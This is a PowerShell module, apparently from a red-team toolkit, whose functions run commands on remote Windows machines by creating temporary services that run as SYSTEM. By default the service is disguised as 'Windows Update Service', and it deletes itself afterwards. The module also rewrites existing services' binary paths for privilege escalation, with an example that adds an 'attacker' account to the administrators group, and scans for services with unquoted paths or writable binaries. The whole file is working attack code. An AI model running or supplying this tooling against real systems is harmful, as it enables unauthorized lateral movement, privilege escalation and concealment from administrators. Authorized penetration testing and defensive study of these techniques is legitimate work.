<#
.SYNOPSIS
    Execute commands on remote systems via Windows services

.DESCRIPTION
    Creates temporary Windows services on remote systems for command execution.
    Services can run as SYSTEM by default, providing elevated access.

.AUTHOR
    Anubhav Gain (@anubhavg-icpl)

.PARAMETER ComputerName
    Target computer name or IP

.PARAMETER Command
    Command to execute

.PARAMETER ServiceName
    Name for the service (default: random)

.EXAMPLE
    Invoke-ServiceExec -ComputerName TARGET-PC -Command "whoami > C:\temp\out.txt"
    Invoke-ServiceExec -ComputerName TARGET-PC -Command "powershell.exe -Command Get-Process" -ServiceName "UpdateSvc"
#>

function Invoke-ServiceExec {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ComputerName,

        [Parameter(Mandatory)]
        [string]$Command,

        [string]$ServiceName = "WinSvc$([guid]::NewGuid().ToString().Substring(0,8))",

        [string]$ServiceDisplayName = "Windows Update Service",

        [switch]$NoCleanup
    )

    Write-Host @"

============================================================
  SERVICE-BASED REMOTE EXECUTION
============================================================
  Target: $ComputerName
  Service: $ServiceName
  Command: $Command
============================================================

"@ -ForegroundColor Cyan

    Write-Warning @"
NOTE: This technique has limitations:
- Command should behave like a service or exit quickly
- For complex commands, wrap in: cmd.exe /c start /b <command>
"@

    # Wrap command to work better as a service
    $binPath = "cmd.exe /c start /b $Command"

    Write-Host "[*] Creating service..." -ForegroundColor Yellow

    try {
        # Create the service
        $createResult = sc.exe \\$ComputerName create $ServiceName binPath= "$binPath" start= demand DisplayName= "$ServiceDisplayName" 2>&1

        if ($LASTEXITCODE -ne 0) {
            throw "Failed to create service: $createResult"
        }

        Write-Host "[+] Service created" -ForegroundColor Green

        # Start the service
        Write-Host "[*] Starting service..." -ForegroundColor Yellow

        $startResult = sc.exe \\$ComputerName start $ServiceName 2>&1

        # Service will likely fail to start properly (expected for non-service binaries)
        # but the command should still execute
        if ($startResult -match 'START_PENDING|RUNNING') {
            Write-Host "[+] Service started" -ForegroundColor Green
        }
        else {
            Write-Host "[*] Service start returned: $startResult" -ForegroundColor Yellow
            Write-Host "[*] (Command may still have executed)" -ForegroundColor Yellow
        }

        # Wait a moment
        Start-Sleep -Seconds 2

        # Cleanup
        if (-not $NoCleanup) {
            Write-Host "[*] Cleaning up service..." -ForegroundColor Yellow

            # Stop service if running
            sc.exe \\$ComputerName stop $ServiceName 2>&1 | Out-Null

            # Delete service
            $deleteResult = sc.exe \\$ComputerName delete $ServiceName 2>&1

            if ($LASTEXITCODE -eq 0) {
                Write-Host "[+] Service deleted" -ForegroundColor Green
            }
            else {
                Write-Warning "Service deletion returned: $deleteResult"
            }
        }
        else {
            Write-Host @"

[!] Service NOT deleted. Clean up manually:
    sc.exe \\$ComputerName delete $ServiceName
"@ -ForegroundColor Yellow
        }

        return $true
    }
    catch {
        Write-Error "Service execution failed: $_"
        return $false
    }
}

function Get-RemoteServices {
    <#
    .SYNOPSIS
        Query services on remote system

    .EXAMPLE
        Get-RemoteServices -ComputerName TARGET-PC
        Get-RemoteServices -ComputerName TARGET-PC -ServiceName "Spooler"
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ComputerName,

        [string]$ServiceName
    )

    try {
        if ($ServiceName) {
            $result = sc.exe \\$ComputerName query $ServiceName 2>&1
        }
        else {
            $result = sc.exe \\$ComputerName query type= all state= all 2>&1
        }

        if ($LASTEXITCODE -eq 0) {
            Write-Host $result
        }
        else {
            Write-Error "Query failed: $result"
        }
    }
    catch {
        Write-Error "Failed to query services: $_"
    }
}

function Set-ServiceBinaryPath {
    <#
    .SYNOPSIS
        Modify service binary path (for privilege escalation)

    .DESCRIPTION
        Changes the binary path of an existing service.
        Useful for exploiting services with weak permissions.

    .EXAMPLE
        Set-ServiceBinaryPath -ComputerName TARGET-PC -ServiceName VulnSvc -BinPath "cmd.exe /c net localgroup administrators attacker /add"
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ComputerName,

        [Parameter(Mandatory)]
        [string]$ServiceName,

        [Parameter(Mandatory)]
        [string]$BinPath,

        [switch]$Restart
    )

    Write-Warning "This modifies existing service configuration!"

    # Get original path first
    $originalConfig = sc.exe \\$ComputerName qc $ServiceName 2>&1
    Write-Host "[*] Original configuration:" -ForegroundColor Yellow
    Write-Host $originalConfig

    Write-Host "`n[*] Setting new binary path..." -ForegroundColor Yellow

    try {
        $result = sc.exe \\$ComputerName config $ServiceName binPath= "$BinPath" 2>&1

        if ($LASTEXITCODE -eq 0) {
            Write-Host "[+] Binary path updated" -ForegroundColor Green

            if ($Restart) {
                Write-Host "[*] Restarting service..." -ForegroundColor Yellow
                sc.exe \\$ComputerName stop $ServiceName 2>&1 | Out-Null
                Start-Sleep -Seconds 2
                sc.exe \\$ComputerName start $ServiceName 2>&1 | Out-Null
            }
        }
        else {
            Write-Error "Failed to update binary path: $result"
        }
    }
    catch {
        Write-Error "Service modification failed: $_"
    }
}

function Find-VulnerableServices {
    <#
    .SYNOPSIS
        Find services with weak permissions (local system only)

    .EXAMPLE
        Find-VulnerableServices
    #>
    [CmdletBinding()]
    param()

    Write-Host "[*] Searching for vulnerable services..." -ForegroundColor Yellow

    $services = Get-WmiObject win32_service | Where-Object {
        $_.PathName -notlike 'C:\Windows\*' -and
        $_.State -eq 'Running'
    }

    foreach ($service in $services) {
        $path = $service.PathName

        # Check for unquoted path vulnerability
        if ($path -notmatch '^"' -and $path -match ' ') {
            Write-Host "[!] Unquoted path: $($service.Name)" -ForegroundColor Red
            Write-Host "    Path: $path" -ForegroundColor Yellow
            Write-Host "    RunAs: $($service.StartName)" -ForegroundColor Yellow
            Write-Host ""
        }

        # Check binary permissions
        $binaryPath = if ($path -match '^"([^"]+)"') {
            $Matches[1]
        }
        else {
            $path.Split(' ')[0]
        }

        if (Test-Path $binaryPath) {
            $acl = Get-Acl $binaryPath -ErrorAction SilentlyContinue
            if ($acl) {
                $vulnerable = $acl.Access | Where-Object {
                    ($_.IdentityReference -match 'Users|Everyone|Authenticated Users') -and
                    ($_.FileSystemRights -match 'Write|FullControl|Modify')
                }

                if ($vulnerable) {
                    Write-Host "[!] Writable binary: $($service.Name)" -ForegroundColor Red
                    Write-Host "    Path: $binaryPath" -ForegroundColor Yellow
                    Write-Host "    RunAs: $($service.StartName)" -ForegroundColor Yellow
                    Write-Host ""
                }
            }
        }
    }
}

# Export functions
Export-ModuleMember -Function Invoke-ServiceExec, Get-RemoteServices, Set-ServiceBinaryPath, Find-VulnerableServices
